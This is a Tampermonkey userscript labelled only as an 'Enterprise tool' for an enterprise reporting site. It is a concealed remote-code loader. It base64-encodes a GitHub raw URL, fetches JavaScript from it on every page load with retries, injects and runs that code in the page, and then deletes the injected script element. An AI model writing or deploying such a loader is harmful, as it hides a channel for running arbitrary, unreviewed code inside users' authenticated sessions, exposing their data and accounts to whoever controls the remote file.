// ==UserScript==
// @name         CAR Tool
// @namespace    http://tampermonkey.net/
// @version      2.1
// @description  Enterprise tool
// @author       Admin
// @match        https://haesl.gaelenlighten.com/Reporting/ReportingManagement*
// @match        https://haesl.gaelenlighten.com/Reporting/Report/Index/*
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @grant        GM_getValue
// @grant        GM_setValue
// ==/UserScript==

(function() {
    'use strict';
    
    // Configuration
    const scriptConfig = {
        // Base64 encoded URL for the main script
        url: 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0p3b1RvTGVlL3BTY3JpcHQvbWFpbi9zY3JpcHRfY29yZS5qcw==',
        timeout: 15000,
        retries: 3
    };
    
    function decodeUrl(encoded) {
        try {
            return atob(encoded);
        } catch (e) {
            console.error('Configuration decode error');
            return null;
        }
    }
    
    function executeScript(scriptContent) {
        try {
            // Create a new script element and inject it
            const scriptElement = document.createElement('script');
            scriptElement.textContent = scriptContent;
            scriptElement.setAttribute('type', 'text/javascript');
            
            // Add to head temporarily
            document.head.appendChild(scriptElement);
            
            // Remove the script element after execution
            setTimeout(() => {
                if (scriptElement.parentNode) {
                    scriptElement.parentNode.removeChild(scriptElement);
                }
            }, 100);
            
            return true;
        } catch (error) {
            console.error('Script execution failed:', error.message);
            return false;
        }
    }
    
    function loadMainScript(attempt = 1) {
        const scriptUrl = decodeUrl(scriptConfig.url);
        if (!scriptUrl) {
            console.error('Invalid configuration');
            return;
        }
        
        const requestUrl = scriptUrl + '?v=' + Date.now() + '&attempt=' + attempt;
        
        GM_xmlhttpRequest({
            method: 'GET',
            url: requestUrl,
            timeout: scriptConfig.timeout,
            onload: function(response) {
                if (response.status === 200) {
                    const scriptContent = response.responseText;
                    
                    // Basic validation
                    if (scriptContent && 
                        scriptContent.length > 1000 && 
                        scriptContent.includes('function')) {
                        
                        const success = executeScript(scriptContent);
                        if (!success && attempt < scriptConfig.retries) {
                            console.warn('Execution failed, retrying...');
                            setTimeout(() => loadMainScript(attempt + 1), 1000);
                        }
                    } else {
                        console.error('Invalid script content received');
                        if (attempt < scriptConfig.retries) {
                            setTimeout(() => loadMainScript(attempt + 1), 2000);
                        }
                    }
                } else {
                    console.error('HTTP error:', response.status);
                    if (attempt < scriptConfig.retries) {
                        setTimeout(() => loadMainScript(attempt + 1), 3000);
                    }
                }
            },
            onerror: function() {
                console.error('Network error loading script');
                if (attempt < scriptConfig.retries) {
                    setTimeout(() => loadMainScript(attempt + 1), 5000);
                }
            },
            ontimeout: function() {
                console.error('Script loading timeout');
                if (attempt < scriptConfig.retries) {
                    setTimeout(() => loadMainScript(attempt + 1), 2000);
                }
            }
        });
    }
    
    function initialize() {
        // Validate environment
        if (!window.location.hostname.includes('haesl.gaelenlighten.com')) {
            console.warn('Script not authorized for this domain');
            return;
        }
        
        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(loadMainScript, 500);
            });
        } else {
            setTimeout(loadMainScript, 100);
        }
    }
    
    // Start initialization
    initialize();
    
})();
